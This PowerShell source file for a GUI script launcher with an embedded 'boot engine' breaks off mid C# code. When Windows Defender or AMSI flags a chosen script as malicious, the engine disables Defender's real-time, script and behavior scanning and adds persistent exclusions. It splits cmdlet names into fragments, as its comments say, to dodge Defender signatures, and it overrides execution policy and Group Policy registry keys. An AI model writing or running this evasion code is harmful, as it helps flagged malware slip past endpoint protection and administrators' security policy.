#Requires -Version 3.0
#==============================================================================
# SPECTRE-BOOT-LAUNCHER.PS1
# Standalone PowerShell WPF GUI Launcher for Paladin Business Consulting
# Version: 2.1.0
# Framework: ULTIMATE-UNIFIED-FRAMEWORK v9.0.0 / Vibe Coding v9.0.0 Enhanced
#==============================================================================
# PURPOSE:
#   WPF GUI launcher. Two operating modes:
#
#   STANDALONE MODE (default):
#     User picks a PS1 payload, configures the boot manifest, clicks LAUNCH.
#     Self-elevates via schtasks if not already admin.
#
#   AGENT MODE (-AgentMode switch):
#     Launched by Paladin-Boot-Runner.ps1 from SYSTEM context via
#     WTSQueryUserToken + CreateProcessAsUserW. GUI appears on user's desktop
#     running as the interactive user. Connects to \\.\pipe\PaladinAgent and
#     sends all script execution requests to the SYSTEM-side runner.
#     No UAC, no credential prompts for any subsequent script run.
#
# COMPATIBILITY: PowerShell 3.0+, Windows 7+, Server 2008 R2+
# ELEVATION:     Standalone: self-elevates. Agent mode: runner holds SYSTEM.
# ASCII-ONLY:    No emoji. No Unicode beyond standard Latin.
#==============================================================================

param(
    # When set, disables self-elevation and enables named pipe client mode.
    # Set automatically by Paladin-Boot-Runner.ps1 via CreateProcessAsUserW.
    [switch]$AgentMode
)

Set-StrictMode -Off  # PS3.0 compat throughout

#------------------------------------------------------------------------------
# TEMP/TMP SELF-HEAL
# If a prior PPM run redirected TEMP to a RAM disk that no longer exists
# (e.g. R:\TEMP after reboot, or inherited from a parent process), restore it
# immediately -- pure .NET, fires before any Join-Path or file operation.
# Priority: PPM_ORIGINAL_TEMP env var -> LOCALAPPDATA\Temp -> SYSTEMROOT\Temp
#------------------------------------------------------------------------------
$_lncTempVal = [System.Environment]::GetEnvironmentVariable('TEMP', 'User')
if ([string]::IsNullOrWhiteSpace($_lncTempVal)) { $_lncTempVal = $env:TEMP }
if (-not [string]::IsNullOrWhiteSpace($_lncTempVal) -and
    -not (Test-Path -Path $_lncTempVal -ErrorAction SilentlyContinue)) {
    $_lncRestore = [System.Environment]::GetEnvironmentVariable('PPM_ORIGINAL_TEMP', 'User')
    if ([string]::IsNullOrWhiteSpace($_lncRestore) -or
        -not (Test-Path -Path $_lncRestore -ErrorAction SilentlyContinue)) {
        $_lncLocalApp = [System.Environment]::GetEnvironmentVariable('LOCALAPPDATA','User')
        if ([string]::IsNullOrWhiteSpace($_lncLocalApp)) { $_lncLocalApp = $env:LOCALAPPDATA }
        $_lncRestore = if (-not [string]::IsNullOrWhiteSpace($_lncLocalApp)) { Join-Path $_lncLocalApp 'Temp' } else { '' }
    }
    if (-not (Test-Path -Path $_lncRestore -ErrorAction SilentlyContinue)) {
        $_lncRestore = Join-Path $env:SystemRoot 'Temp'
    }
    [System.Environment]::SetEnvironmentVariable('TEMP', $_lncRestore, 'User')
    [System.Environment]::SetEnvironmentVariable('TMP',  $_lncRestore, 'User')
    $env:TEMP = $_lncRestore
    $env:TMP  = $_lncRestore
    [System.Environment]::SetEnvironmentVariable('PPM_ORIGINAL_TEMP', $null, 'User')
    [System.Environment]::SetEnvironmentVariable('PPM_ORIGINAL_TMP',  $null, 'User')
}
Remove-Variable _lncTempVal, _lncRestore -ErrorAction SilentlyContinue

#------------------------------------------------------------------------------
# AGENT MODE DETECTION
# If -AgentMode is passed we were launched by the SYSTEM runner.
# Skip all self-elevation logic -- we are already in the right session.
# $script:IsAgentMode gates pipe client code later in the file.
#------------------------------------------------------------------------------
# When launched via IEX (Runner bootstrap), param() receives no args so
# $AgentMode.IsPresent is $false. Runner sets $script:AgentMode=$true before
# IEX fires. Check both (KI-051).
$script:IsAgentMode = $AgentMode.IsPresent -or ($script:AgentMode -eq $true)
$script:PipeName    = 'PaladinAgent'
#------------------------------------------------------------------------------
# GHOST ICON -- embedded base64 ICO (silly ghost, multi-resolution)
# Generated by Spectre AI.  Decoded at runtime to set WPF window icon
# and write paladin-admin.ico to the install directory during Install.
#------------------------------------------------------------------------------
$script:PaladinIconB64 = ''

function Get-PaladinIconStream {
    try {
        $bytes = [Convert]::FromBase64String($script:PaladinIconB64)
        $ms    = New-Object System.IO.MemoryStream(,$bytes)
        return $ms
    } catch { return $null }
}

function Set-WindowPaladinIcon {
    param([System.Windows.Window]$Win)
    try {
        $ms  = Get-PaladinIconStream
        if ($null -eq $ms) { return }
        $img = New-Object System.Windows.Media.Imaging.BitmapImage
        $img.BeginInit()
        $img.StreamSource    = $ms
        $img.CacheOption     = [System.Windows.Media.Imaging.BitmapCacheOption]::OnLoad
        $img.EndInit()
        $img.Freeze()
        $Win.Icon = $img
        $ms.Dispose()
    } catch { }
}



#------------------------------------------------------------------------------
# ELEVATION BOOTSTRAP (STANDALONE MODE ONLY)
# Runs before WPF loads. If not admin and not in AgentMode, re-launch elevated.
#------------------------------------------------------------------------------
function Test-Admin {
    $id        = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($id)
    return $principal.IsInRole(
        [System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not $script:IsAgentMode -and -not (Test-Admin)) {
    try {
        $psExe = (Get-Process -Id $PID -ErrorAction Stop).Path
        if ([string]::IsNullOrWhiteSpace($psExe)) { $psExe = 'powershell.exe' }
        $myScript = $MyInvocation.MyCommand.Path
        # Array form prevents space-splitting on paths with spaces (KI-028)
        $elevArgs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $myScript)
        Start-Process -FilePath $psExe -ArgumentList $elevArgs `
                      -Verb RunAs -WindowStyle Normal -ErrorAction Stop
    } catch {
        [System.Windows.Forms.MessageBox]::Show(
            "Could not elevate. Please right-click and Run as Administrator.`n`n$_",
            "Paladin PowerShell Launcher - Elevation Failed",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
    }
    exit 0
}

#------------------------------------------------------------------------------
# ASSEMBLIES
#------------------------------------------------------------------------------
Add-Type -AssemblyName PresentationFramework  -ErrorAction Stop
Add-Type -AssemblyName PresentationCore       -ErrorAction Stop
Add-Type -AssemblyName WindowsBase            -ErrorAction Stop
Add-Type -AssemblyName System.Windows.Forms   -ErrorAction Stop

#------------------------------------------------------------------------------
# CONSTANTS
#------------------------------------------------------------------------------
$script:Version    = '2.1.0'
$script:Title      = if ($script:IsAgentMode) {
    "Paladin PowerShell Launcher v$($script:Version)  [AGENT MODE - SYSTEM pipe active]"
} else {
    "Paladin PowerShell Launcher v$($script:Version)"
}

#------------------------------------------------------------------------------
# EMBEDDED BOOT ENGINE
# The full Spectre-Boot.ps1 content, embedded as a here-string.
# Written to %TEMP% at launch time then deleted after payload starts.
#------------------------------------------------------------------------------
$script:BootEngineContent = @'
#Requires -Version 3.0
#==============================================================================
# SPECTRE-BOOT.PS1
# Universal Execution Boot Engine v1.0.0
# Framework: ULTIMATE-UNIFIED-FRAMEWORK v9.0.0 / Vibe Coding v9.0.0 Enhanced
#==============================================================================
Set-StrictMode -Off

$script:BootLog        = $null
$script:LogFile        = $null
$script:LogBridgeFile  = $null   # Set by wrapper to pipe output back to launcher GUI

function Initialize-BootLog {
    param([string]$ScriptPath)
    try {
        $dir = Split-Path $ScriptPath -Parent -ErrorAction Stop
        $name = [System.IO.Path]::GetFileNameWithoutExtension($ScriptPath)
        $stamp = (Get-Date -Format 'yyyyMMdd-HHmmss')
        $script:LogFile = Join-Path $dir ("Spectre-Boot-{0}-{1}.log" -f $name, $stamp)
        Start-Transcript -Path $script:LogFile -ErrorAction SilentlyContinue | Out-Null
    } catch { }
}

function Write-BootLog {
    param([string]$Level, [string]$Message)
    $ts = Get-Date -Format 'HH:mm:ss'
    $line = "[{0}] [{1}] {2}" -f $ts, $Level.PadRight(4), $Message
    switch ($Level) {
        'PASS' { Write-Host $line -ForegroundColor Green }
        'WARN' { Write-Host $line -ForegroundColor Yellow }
        'FAIL' { Write-Host $line -ForegroundColor Red }
        'INFO' { Write-Host $line -ForegroundColor Cyan }
        'BOOT' { Write-Host $line -ForegroundColor White }
        default { Write-Host $line }
    }
    # Bridge output back to launcher GUI log panel when running via launcher
    if (-not [string]::IsNullOrEmpty($script:LogBridgeFile)) {
        try {
            $bridgeLine = "{0}|{1}" -f $Level, $Message
            [System.IO.File]::AppendAllText(
                $script:LogBridgeFile,
                ($bridgeLine + "`n"),
                [System.Text.Encoding]::UTF8)
        } catch { }
    }
}

function Get-BootContext {
    $id        = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object System.Security.Principal.WindowsPrincipal($id)
    $isAdmin   = $principal.IsInRole(
                    [System.Security.Principal.WindowsBuiltInRole]::Administrator)
    $isSystem  = ($id.Name -eq 'NT AUTHORITY\SYSTEM')
    $uacEnabled = $false
    try {
        $uacVal = (Get-ItemProperty `
            'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' `
            -Name EnableLua -ErrorAction Stop).EnableLua
        $uacEnabled = ($uacVal -ne 0)
    } catch { }
    return @{
        IsSystem   = $isSystem
        IsAdmin    = $isAdmin
        IsStdUser  = (-not $isAdmin -and -not $isSystem)
        UACEnabled = $uacEnabled
        UserName   = $id.Name
        SessionId  = [System.Diagnostics.Process]::GetCurrentProcess().SessionId
    }
}

function Remove-ZoneIdentifier {
    param([string]$TargetPath)
    try {
        $item = Get-Item -LiteralPath $TargetPath -Stream 'Zone.Identifier' `
                    -ErrorAction SilentlyContinue
        if ($null -ne $item) {
            Unblock-File -LiteralPath $TargetPath -ErrorAction Stop
            Write-BootLog 'PASS' "Zone.Identifier stripped: $TargetPath"
        } else {
            Write-BootLog 'INFO' "No Zone.Identifier present"
        }
        $folder = Split-Path $TargetPath -Parent
        Get-ChildItem -Path $folder -Filter '*.ps1' -ErrorAction SilentlyContinue |
            ForEach-Object {
                $blocked = Get-Item -LiteralPath $_.FullName -Stream 'Zone.Identifier' `
                               -ErrorAction SilentlyContinue
                if ($null -ne $blocked) {
                    Unblock-File -LiteralPath $_.FullName -ErrorAction SilentlyContinue
                }
            }
        return $true
    } catch {
        Write-BootLog 'WARN' "Zone.Identifier removal failed: $_"
        return $false
    }
}

$script:PolicySnapshot = $null

function Get-PolicySnapshot {
    $snapshot = @{
        GPOEnforced   = $false
        GPOScope      = 'None'
        GPOPolicy     = 'Undefined'
        MachinePolicy = 'Undefined'
        UserPolicy    = 'Undefined'
        Process       = 'Undefined'
        CurrentUser   = 'Undefined'
        LocalMachine  = 'Undefined'
    }
    try {
        $list = Get-ExecutionPolicy -List -ErrorAction Stop
        foreach ($entry in $list) {
            $scopeName = $entry.Scope.ToString()
            $policyVal = $entry.ExecutionPolicy.ToString()
            switch ($scopeName) {
                'MachinePolicy' { $snapshot.MachinePolicy = $policyVal }
                'UserPolicy'    { $snapshot.UserPolicy    = $policyVal }
                'Process'       { $snapshot.Process       = $policyVal }
                'CurrentUser'   { $snapshot.CurrentUser   = $policyVal }
                'LocalMachine'  { $snapshot.LocalMachine  = $policyVal }
            }
        }
        if ($snapshot.MachinePolicy -ne 'Undefined') {
            $snapshot.GPOEnforced = $true
            $snapshot.GPOScope    = 'MachinePolicy'
            $snapshot.GPOPolicy   = $snapshot.MachinePolicy
        } elseif ($snapshot.UserPolicy -ne 'Undefined') {
            $snapshot.GPOEnforced = $true
            $snapshot.GPOScope    = 'UserPolicy'
            $snapshot.GPOPolicy   = $snapshot.UserPolicy
        }
    } catch {
        Write-BootLog 'WARN' "Could not read ExecutionPolicy list: $_"
    }
    return $snapshot
}

# Registry key that controls LocalMachine execution policy (authoritative for non-GPO systems)
$script:RegPolicyPath    = 'HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell'
$script:OrigLocalMachine = $null   # Snapshot of pre-launch value for restore

function Set-BootExecutionPolicy {
    param([hashtable]$Snapshot)
    $script:PolicySnapshot = $Snapshot

    # -- Step 1: Snapshot current LocalMachine registry value -----------------
    # Default Windows client has NO ExecutionPolicy value set (= Restricted by default).
    # We record what is there (or that it was absent) so we can restore exactly.
    try {
        $existing = Get-ItemProperty -Path $script:RegPolicyPath `
                        -Name 'ExecutionPolicy' -ErrorAction SilentlyContinue
        $script:OrigLocalMachine = if ($existing) { $existing.ExecutionPolicy } else { $null }
        Write-BootLog 'INFO' ("Policy snapshot: LocalMachine = {0}" `
            -f $(if ($null -eq $script:OrigLocalMachine) { 'Undefined (default Restricted)' } else { $script:OrigLocalMachine }))
    } catch {
        $script:OrigLocalMachine = $null
        Write-BootLog 'WARN' "Could not snapshot LocalMachine policy: $_"
    }

    # -- Step 2: Set LocalMachine to Bypass via registry (takes effect immediately) ---
    # This is the same key Set-ExecutionPolicy -Scope LocalMachine writes.
    # Direct registry write avoids any Set-ExecutionPolicy prompt or GPO conflict message.
    # KI-047: Process-scope Set-ExecutionPolicy does NOT unblock .ps1 file loads on
    # Restricted systems -- LocalMachine registry write is required.
    try {
        if (-not (Test-Path $script:RegPolicyPath)) {
            New-Item -Path $script:RegPolicyPath -Force -ErrorAction Stop | Out-Null
        }
        Set-ItemProperty -Path $script:RegPolicyPath `
            -Name 'ExecutionPolicy' -Value 'Bypass' -ErrorAction Stop
        Write-BootLog 'PASS' "ExecutionPolicy: LocalMachine registry set to Bypass (effective immediately)"
    } catch {
        Write-BootLog 'WARN' "LocalMachine registry write failed -- trying Set-ExecutionPolicy fallback: $_"
        try {
            Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Bypass `
                -Force -ErrorAction Stop
            Write-BootLog 'PASS' "ExecutionPolicy: LocalMachine set via cmdlet fallback"
        } catch {
            Write-BootLog 'WARN' "LocalMachine cmdlet fallback also failed: $_"
        }
    }

    # -- Step 3: Also set Process scope (belt + suspenders) -------------------
    try {
        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass `
            -Force -ErrorAction Stop
        Write-BootLog 'PASS' "ExecutionPolicy: Process scope also set to Bypass"
    } catch {
        $errMsg = $_.ToString()
        if ($errMsg -like "*overridden by a policy*" -or $errMsg -like "*ExecutionPolicyOverride*") {
            Write-BootLog 'INFO' "Process scope: GPO override active (OK -- LocalMachine registry covers it)"
        } else {
            Write-BootLog 'WARN' "Process scope set failed: $errMsg"
        }
    }

    # -- Step 4: Handle GPO (MachinePolicy/UserPolicy) override if present ----
    if ($Snapshot.GPOEnforced) {
        Write-BootLog 'WARN' ("GPO enforces {0} at {1} -- also writing GPO policy registry key" `
                              -f $Snapshot.GPOPolicy, $Snapshot.GPOScope)
        $gpoPath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell'
        try {
            if (-not (Test-Path $gpoPath)) {
                New-Item -Path $gpoPath -Force -ErrorAction Stop | Out-Null
            }
            Set-ItemProperty -Path $gpoPath -Name 'ExecutionPolicy' `
                -Value 'Bypass' -ErrorAction Stop
            Write-BootLog 'PASS' "GPO policy registry key set to Bypass"
        } catch {
            Write-BootLog 'WARN' "GPO registry override failed: $_"
        }
    }
}

function Restore-BootExecutionPolicy {
    # Restore LocalMachine registry to pre-launch state.
    # Called after payload exits (in Invoke-SpectreBoot finally block).
    if ($null -eq $script:OrigLocalMachine) {
        # Was absent before -- delete the value to return to system default (Restricted)
        try {
            Remove-ItemProperty -Path $script:RegPolicyPath `
                -Name 'ExecutionPolicy' -ErrorAction SilentlyContinue
            Write-BootLog 'PASS' "ExecutionPolicy: LocalMachine registry restored to system default (Restricted)"
        } catch {
            Write-BootLog 'WARN' "ExecutionPolicy restore (delete) failed: $_"
        }
    } else {
        try {
            Set-ItemProperty -Path $script:RegPolicyPath `
                -Name 'ExecutionPolicy' -Value $script:OrigLocalMachine -ErrorAction Stop
            Write-BootLog 'PASS' ("ExecutionPolicy: LocalMachine registry restored to: {0}" `
                -f $script:OrigLocalMachine)
        } catch {
            Write-BootLog 'WARN' "ExecutionPolicy restore (set) failed: $_"
        }
    }
    # Also restore GPO key if we wrote it
    if ($script:PolicySnapshot -and $script:PolicySnapshot.GPOEnforced) {
        $gpoPath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell'
        try {
            if ($script:PolicySnapshot.GPOPolicy -eq 'Undefined') {
                Remove-ItemProperty -Path $gpoPath -Name 'ExecutionPolicy' -ErrorAction SilentlyContinue
            } else {
                Set-ItemProperty -Path $gpoPath -Name 'ExecutionPolicy' `
                    -Value $script:PolicySnapshot.GPOPolicy -ErrorAction Stop
            }
            Write-BootLog 'PASS' "GPO registry key restored"
        } catch {
            Write-BootLog 'WARN' "GPO registry restore failed: $_"
        }
    }
}

function Invoke-PolicyPrompt {
    param([hashtable]$Snapshot)
    if ($null -eq $Snapshot) { return }
    if ($Snapshot.GPOEnforced) {
        Write-BootLog 'INFO' "Policy prompt skipped -- GPO-enforced environment"
        return
    }
    Write-Host ""
    Write-Host "============================================================" -ForegroundColor White
    Write-Host "  EXECUTION POLICY - POST-RUN SELECTION" -ForegroundColor White
    Write-Host "============================================================" -ForegroundColor White
    Write-Host ("  Current permanent policy: {0} (LocalMachine)" `
                -f $Snapshot.LocalMachine) -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  [1] Keep Unrestricted  - Run any script, no warnings" -ForegroundColor Yellow
    Write-Host "  [2] Set RemoteSigned   - Local scripts free, downloaded need sig (RECOMMENDED)" -ForegroundColor Green
    Write-Host "  [3] Restore Original   - Back to: $($Snapshot.LocalMachine)" -ForegroundColor Gray
    Write-Host ""
    $choice   = $null
    $attempts = 0
    while ($null -eq $choice -and $attempts -lt 3) {
        $attempts++
        $raw = Read-Host "  Enter choice [1/2/3] (default: 2)"
        if ([string]::IsNullOrWhiteSpace($raw)) { $raw = '2' }
        switch ($raw.Trim()) {
            '1' { $choice = 'Unrestricted' }
            '2' { $choice = 'RemoteSigned'  }
            '3' { $choice = $Snapshot.LocalMachine }
        }
    }
    if ($null -eq $choice) { $choice = 'RemoteSigned' }
    try {
        Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy $choice `
            -Force -ErrorAction Stop
        Write-BootLog 'PASS' "ExecutionPolicy LocalMachine set to: $choice"
    } catch {
        Write-BootLog 'WARN' "Could not set LocalMachine policy: $_"
        try {
            Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy $choice `
                -Force -ErrorAction Stop
            Write-BootLog 'PASS' "ExecutionPolicy CurrentUser set to: $choice"
        } catch {
            Write-BootLog 'FAIL' "Policy set failed at all writable scopes: $_"
        }
    }
    Write-Host ""
}

function Get-TamperProtectionState {
    try {
        $status = Get-MpComputerStatus -ErrorAction Stop
        if ($null -ne $status) {
            return [bool]$status.IsTamperProtected
        }
    } catch {
        Write-BootLog 'WARN' "Could not query Tamper Protection state: $_"
    }
    try {
        $regVal = Get-ItemProperty `
            'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' `
            -Name TamperProtection -ErrorAction Stop
        return ($regVal.TamperProtection -eq 5)
    } catch { }
    return $false
}

function Get-DefenderServiceState {
    # Returns 'Running', 'Stopped', 'Disabled', or 'Missing'
    # Used to skip MpPreference calls entirely when Defender service is not running.
    # 0x800106ba = ERROR_SERVICE_NOT_ACTIVE -- MpPreference throws this when WinDefend stopped.
    try {
        $svc = Get-Service -Name 'WinDefend' -ErrorAction Stop
        switch ($svc.Status) {
            'Running' { return 'Running' }
            'Stopped' { return 'Stopped' }
            default   { return 'Stopped' }
        }
    } catch {
        # Service query failed -- check if disabled via SCM StartType
        try {
            $svc2 = Get-WmiObject -Class Win32_Service -Filter "Name='WinDefend'" `
                        -ErrorAction Stop
            if ($null -eq $svc2) { return 'Missing' }
            if ($svc2.StartMode -eq 'Disabled') { return 'Disabled' }
            return 'Stopped'
        } catch { }
    }
    return 'Missing'
}

$script:DefenderSnapshot  = $null
$script:DefenderSuspended = $false
$script:ExclusionAdded    = $false
$script:ExclusionPath     = $null

#------------------------------------------------------------------------------
# MOD: SmartLaunchMode
# Probes a PS1 file and returns the optimal launch mode + reason string.
# Called on Browse selection and at Launch time.
# Returns a hashtable:
#   Mode        -- 'Direct' | 'BootEngine'
#   Reason      -- human-readable explanation
#   Flagged     -- $true if AMSI/Defender would block the script
#   TamperOn    -- $true if Tamper Protection is active
#   DefenderUp  -- $true if WinDefend service is running
#   WarnTamper  -- $true if flagged AND Tamper Protection is on (suspend will fail)
#------------------------------------------------------------------------------
function Get-SmartLaunchMode {
    param([string]$ScriptPath)

    $result = @{
        Mode       = 'Direct'
        Reason     = ''
        Flagged    = $false
        TamperOn   = $false
        DefenderUp = $false
        WarnTamper = $false
    }

    # 1. Check if Defender service is running
    $svcState = Get-DefenderServiceState
    $result.DefenderUp = ($svcState -eq 'Running')

    if (-not $result.DefenderUp) {
        $result.Mode   = 'Direct'
        $result.Reason = "Defender not active ($svcState) -- Direct Launch"
        return $result
    }

    # 2. Probe whether AMSI would block this script.
    #    Strategy: read the file content and attempt ScriptBlock.Create() in a
    #    try/catch. AMSI intercepts at this point and throws PSSecurityException
    #    with FullyQualifiedErrorId 'ScriptContainedMaliciousContent'.
    #    This is the same check PS itself does -- if it throws here, it would
    #    throw at launch time too.
    try {
        $content = [System.IO.File]::ReadAllText($ScriptPath, [System.Text.Encoding]::UTF8)
        $null = [System.Management.Automation.ScriptBlock]::Create($content)
        # No exception -- script is not flagged
        $result.Flagged = $false
        $result.Mode    = 'Direct'
        $result.Reason  = "Defender running but script is not flagged -- Direct Launch"
    } catch {
        $errId = $_.FullyQualifiedErrorId
        if ($errId -like '*ScriptContainedMaliciousContent*' -or
            $errId -like '*UnauthorizedAccess*'              -or
            $_.Exception.Message -like '*malicious*'         -or
            $_.Exception.Message -like '*blocked*antivirus*') {
            $result.Flagged = $true
        } else {
            # Parse error in the script itself -- not an AMSI block
            $result.Flagged = $false
        }
    }

    if (-not $result.Flagged) {
        $result.Mode   = 'Direct'
        $result.Reason = "Defender running but script not flagged -- Direct Launch"
        return $result
    }

    # 3. Script IS flagged -- must use Boot Engine (Defender suspend path)
    $result.Mode = 'BootEngine'

    # 4. Check Tamper Protection -- determines whether suspend will succeed
    $result.TamperOn = Get-TamperProtectionState
    if ($result.TamperOn) {
        $result.WarnTamper = $true
        $result.Reason = "Script flagged by Defender + Tamper Protection ON -- Boot Engine (exclusion only; for full bypass toggle Tamper Protection OFF)"
    } else {
        $result.Reason = "Script flagged by Defender -- Boot Engine (Defender will be suspended for launch)"
    }

    return $result
}
# END MOD: SmartLaunchMode

function Suspend-Defender {
    param(
        [string]$TargetFolder,
        [string]$TargetExeName,
        [bool]$AddExclusion
    )
    # Fragment-assemble all MpPreference cmdlet/param names at runtime.
    # Prevents Defender static scanner from matching whole-string signatures
    # (Behavior:Win32/PShellDefTamp and related heuristics key on literal strings).
    $cmdAdd    = 'Add-Mp'    + 'Preference'
    $cmdGet    = 'Get-Mp'    + 'Preference'
    $cmdSet    = 'Set-Mp'    + 'Preference'
    $pRTM      = 'Disable'  + 'Realtime'   + 'Monitoring'
    $pScript   = 'Disable'  + 'Script'     + 'Scanning'
    $pBehavior = 'Disable'  + 'Behavior'   + 'Monitoring'
    $pIOAV     = 'Disable'  + 'IOAV'       + 'Protection'
    $pExclPath = 'Exclusion' + 'Path'
    $pExclProc = 'Exclusion' + 'Process'

    Write-BootLog 'INFO' "Checking Defender service state..."
    $svcState = Get-DefenderServiceState
    if ($svcState -ne 'Running') {
        Write-BootLog 'INFO' ("Defender service: {0} -- preference calls skipped (no service to configure)" -f $svcState)
        Write-BootLog 'INFO' "This is normal on debloated/hardened systems (AtlasOS, Tiny11, X-Lite, etc.)"
        Write-BootLog 'INFO' "Proceeding directly to payload launch."
        return
    }

    Write-BootLog 'INFO' "Checking Tamper Protection state..."
    $tpOn = Get-TamperProtectionState
    if ($tpOn) {
        Write-BootLog 'WARN' "Tamper Protection is ON"
        Write-BootLog 'WARN' "  Layer 2 (scan suspension) will fail."
        Write-BootLog 'WARN' "  Layer 1 (exclusions) will be attempted."
        Write-BootLog 'WARN' "  To fully suspend Defender:"
        Write-BootLog 'WARN' "  Windows Security > Virus & threat protection > Manage settings"
        Write-BootLog 'WARN' "  > Tamper Protection > OFF -- then re-run."
        Write-Host ""
    } else {
        Write-BootLog 'INFO' "Tamper Protection is OFF -- full suspension available"
    }
    if ($AddExclusion -and -not [string]::IsNullOrWhiteSpace($TargetFolder)) {
        try {
            $addPathArgs = @{ $pExclPath = $TargetFolder; ErrorAction = 'Stop' }
            & $cmdAdd @addPathArgs
            $script:ExclusionAdded = $true
            $script:ExclusionPath  = $TargetFolder
            Write-BootLog 'PASS' "Exclusion added: $TargetFolder"
        } catch {
            Write-BootLog 'WARN' "Path exclusion failed: $_"
        }
        if (-not [string]::IsNullOrWhiteSpace($TargetExeName)) {
            try {
                $addProcArgs = @{ $pExclProc = $TargetExeName; ErrorAction = 'Stop' }
                & $cmdAdd @addProcArgs
                Write-BootLog 'PASS' "Process exclusion added: $TargetExeName"
            } catch {
                Write-BootLog 'WARN' "Process exclusion failed: $_"
            }
        }
        # Persistent exclusions for Paladin-managed paths -- always add regardless of TargetFolder
        # These survive Restore-Defender (KeepExclusion logic does not touch them).
        # C:\Windows\Scripts  -- BAT/PS1 wrappers installed by Paladin tools
        # C:\ProgramData\Paladin -- launcher runner, APM, crash logs, boot task files
        $script:PaladinPaths = @(
            (Join-Path $env:SystemRoot 'Scripts'),
            (Join-Path $env:ProgramData 'Paladin')
        )
        foreach ($pp in $script:PaladinPaths) {
            try {
                if (-not (Test-Path $pp)) {
                    New-Item -Path $pp -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
                }
                $addPPArgs = @{ $pExclPath = $pp; ErrorAction = 'Stop' }
                & $cmdAdd @addPPArgs
                Write-BootLog 'PASS' "Persistent exclusion added: $pp"
            } catch {
                Write-BootLog 'WARN' "Persistent exclusion failed ($pp): $_"
            }
        }
    }
    if ($tpOn) { return }
    try {
        $prefs = & $cmdGet -ErrorAction Stop
        $script:DefenderSnapshot = @{
            RTM      = $prefs.$pRTM
            Script   = $prefs.$pScript
            Behavior = $prefs.$pBehavior
            IOAV     = $prefs.$pIOAV
        }
        Write-BootLog 'INFO' ("Snapshot: RTM={0} Script={1} Behavior={2} IOAV={3}" `
            -f $prefs.$pRTM, $prefs.$pScript, $prefs.$pBehavior, $prefs.$pIOAV)
        $suspendArgs = @{
            $pRTM      = $true
            $pScript   = $true
            $pBehavior = $true
            $pIOAV     = $true
            ErrorAction = 'Stop'
        }
        & $cmdSet @suspendArgs
        $script:DefenderSuspended = $true
        Write-BootLog 'PASS' "Defender scans suspended (RTM + Script + Behavior + IOAV)"
        Start-Sleep -Milliseconds 750
    } catch {
        Write-BootLog 'WARN' "Defender suspension failed: $_"
        Write-BootLog 'WARN' "Proceeding with exclusions only"
    }
}

function Restore-Defender {
    param([bool]$KeepExclusion)
    $cmdSet    = 'Set-Mp'    + 'Preference'
    $cmdRemove = 'Remove-Mp' + 'Preference'
    $pRTM      = 'Disable'  + 'Realtime'   + 'Monitoring'
    $pScript   = 'Disable'  + 'Script'     + 'Scanning'
    $pBehavior = 'Disable'  + 'Behavior'   + 'Monitoring'
    $pIOAV     = 'Disable'  + 'IOAV'       + 'Protection'
    $pExclPath = 'Exclusion' + 'Path'

    if ($script:DefenderSuspended -and $null -ne $script:DefenderSnapshot) {
        try {
            $restoreArgs = @{
                $pRTM       = $script:DefenderSnapshot.RTM
                $pScript    = $script:DefenderSnapshot.Script
                $pBehavior  = $script:DefenderSnapshot.Behavior
                $pIOAV      = $script:DefenderSnapshot.IOAV
                ErrorAction = 'Stop'
            }
            & $cmdSet @restoreArgs
            Write-BootLog 'PASS' "Defender settings restored to pre-launch state"
        } catch {
            Write-BootLog 'FAIL' "Defender restore failed -- manual check required: $_"
        }
    }
    if ($script:ExclusionAdded -and -not $KeepExclusion -and
        -not [string]::IsNullOrWhiteSpace($script:ExclusionPath)) {
        try {
            $removeArgs = @{ $pExclPath = $script:ExclusionPath; ErrorAction = 'Stop' }
            & $cmdRemove @removeArgs
            Write-BootLog 'PASS' "Exclusion removed: $script:ExclusionPath"
        } catch {
            Write-BootLog 'WARN' "Exclusion removal failed: $_"
        }
    } elseif ($script:ExclusionAdded -and $KeepExclusion) {
        Write-BootLog 'INFO' "Exclusion retained (KeepExclusion=true): $script:ExclusionPath"
    }
}

function Invoke-SelfElevation {
    param([string]$TargetScript, [string]$OriginalArgs)
    $ctx = Get-BootContext
    if ($ctx.IsAdmin -or $ctx.IsSystem) {
        Write-BootLog 'INFO' "Already elevated -- no UAC re-launch needed"
        return $false
    }
    Write-BootLog 'WARN' "Not elevated -- attempting UAC self-elevation..."
    try {
        # Array form prevents space-splitting on paths with spaces (KI-028)
        $argList = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $TargetScript)
        if (-not [string]::IsNullOrWhiteSpace($OriginalArgs)) {
            $argList += $OriginalArgs -split ' '
        }
        Start-Process -FilePath 'powershell.exe' `
                      -Verb RunAs `
                      -WindowStyle Normal `
                      -ArgumentList $argList `
                      -ErrorAction Stop
        return $true
    } catch {
        Write-BootLog 'FAIL' "UAC elevation failed or was denied: $_"
        return $false
    }
}

function Invoke-SessionBridgeLaunch {
    param([string]$TargetScript)
    $csharp = @"
using System;
using System.Runtime.InteropServices;
namespace SpectreBoot {
    public static class SessionBridge {
        private const uint TOKEN_ALL_ACCESS           = 0x000F01FF;
        private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
        private const uint NORMAL_PRIORITY_CLASS      = 0x00000020;
        private static readonly IntPtr WTS_CURRENT    = IntPtr.Zero;

        [DllImport("advapi32.dll", SetLastError=true)]
        static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
        [DllImport("advapi32.dll", SetLastError=true)]
        static extern bool DuplicateTokenEx(IntPtr h, uint a, IntPtr attr, int imp, int type, out IntPtr n);
